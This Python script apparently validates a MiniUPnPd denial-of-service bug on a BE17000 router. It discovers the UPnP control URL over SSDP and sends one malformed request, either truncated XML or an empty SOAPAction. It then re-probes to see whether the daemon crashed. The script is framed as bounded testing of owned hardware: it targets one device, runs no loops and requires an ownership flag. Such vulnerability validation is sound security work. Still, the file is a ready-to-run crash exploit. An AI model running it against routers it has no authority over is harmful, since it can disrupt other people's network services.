#!/usr/bin/env python3
"""Bounded MiniUPnPd crash validation for an owned BE17000.

The tool sends one malformed request to one explicit target. It does not scan,
loop, retry, or generate concurrent traffic.
"""

from __future__ import annotations

import argparse
import http.client
import socket
import sys
import time
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


SSDP_REQUEST = (
    "M-SEARCH * HTTP/1.1\r\n"
    "HOST: {target}:1900\r\n"
    'MAN: "ssdp:discover"\r\n'
    "MX: 1\r\n"
    "ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n"
    "\r\n"
).encode("ascii")


def discover_location(target: str, timeout: float) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(SSDP_REQUEST.replace(b"{target}", target.encode("ascii")), (target, 1900))
        data, peer = sock.recvfrom(65535)
    finally:
        sock.close()
    if peer[0] != target:
        raise RuntimeError(f"SSDP response came from unexpected host {peer[0]}")
    headers = {}
    for line in data.decode("iso-8859-1", "replace").split("\r\n")[1:]:
        if ":" in line:
            name, value = line.split(":", 1)
            headers[name.strip().lower()] = value.strip()
    location = headers.get("location")
    if not location:
        raise RuntimeError("SSDP response did not contain LOCATION")
    parsed = urllib.parse.urlsplit(location)
    if parsed.hostname != target:
        raise RuntimeError(f"LOCATION points to unexpected host {parsed.hostname}")
    return location


def find_control_url(location: str, timeout: float) -> tuple[str, str]:
    with urllib.request.urlopen(location, timeout=timeout) as response:
        document = response.read(1024 * 1024)
    root = ET.fromstring(document)
    for service in root.iter():
        if not service.tag.endswith("service"):
            continue
        values = {child.tag.rsplit("}", 1)[-1]: (child.text or "") for child in service}
        service_type = values.get("serviceType", "")
        if "WANIPConnection" in service_type or "WANPPPConnection" in service_type:
            return urllib.parse.urljoin(location, values["controlURL"]), service_type
    raise RuntimeError("no WANIPConnection/WANPPPConnection control URL found")


def send_probe(control_url: str, service_type: str, mode: str, timeout: float) -> str:
    parsed = urllib.parse.urlsplit(control_url)
    if parsed.scheme != "http":
        raise RuntimeError(f"unsupported control URL scheme: {parsed.scheme}")
    connection = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=timeout)
    if mode == "xml":
        body = b"<element attribute="
        soap_action = f'"{service_type}#GetExternalIPAddress"'
    else:
        body = (
            b'<?xml version="1.0"?>'
            b'<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            b"<s:Body/></s:Envelope>"
        )
        soap_action = ""
    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "Content-Length": str(len(body)),
        "SOAPAction": soap_action,
        "Connection": "close",
    }
    try:
        connection.request("POST", parsed.path or "/", body=body, headers=headers)
        response = connection.getresponse()
        response.read(4096)
        return f"HTTP {response.status} {response.reason}"
    except (ConnectionError, TimeoutError, OSError, http.client.HTTPException) as exc:
        return f"connection ended without a complete HTTP response: {exc}"
    finally:
        connection.close()


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Send one bounded malformed UPnP request to an owned BE17000"
    )
    parser.add_argument("--target", required=True, help="Exact LAN IPv4 address of the owned router")
    parser.add_argument("--mode", required=True, choices=("xml", "soapaction"))
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument(
        "--i-own-this-router",
        action="store_true",
        help="Required acknowledgement that the target is authorized test hardware",
    )
    args = parser.parse_args()
    if not args.i_own_this_router:
        parser.error("--i-own-this-router is required")
    try:
        socket.inet_aton(args.target)
        location = discover_location(args.target, args.timeout)
        control_url, service_type = find_control_url(location, args.timeout)
        print(f"LOCATION: {location}")
        print(f"Control URL: {control_url}")
        print(f"Probe result: {send_probe(control_url, service_type, args.mode, args.timeout)}")
        time.sleep(1.0)
        try:
            after = discover_location(args.target, args.timeout)
            print(f"Post-check: UPnP responded ({after})")
            print("Outcome: no observable persistent MiniUPnPd DoS")
            return 1
        except Exception as exc:
            print(f"Post-check: no UPnP response ({exc})")
            print("Outcome: possible daemon crash; confirm PID/logs and repeat once from a clean boot")
            return 0
    except Exception as exc:
        print(f"Validation failed safely: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
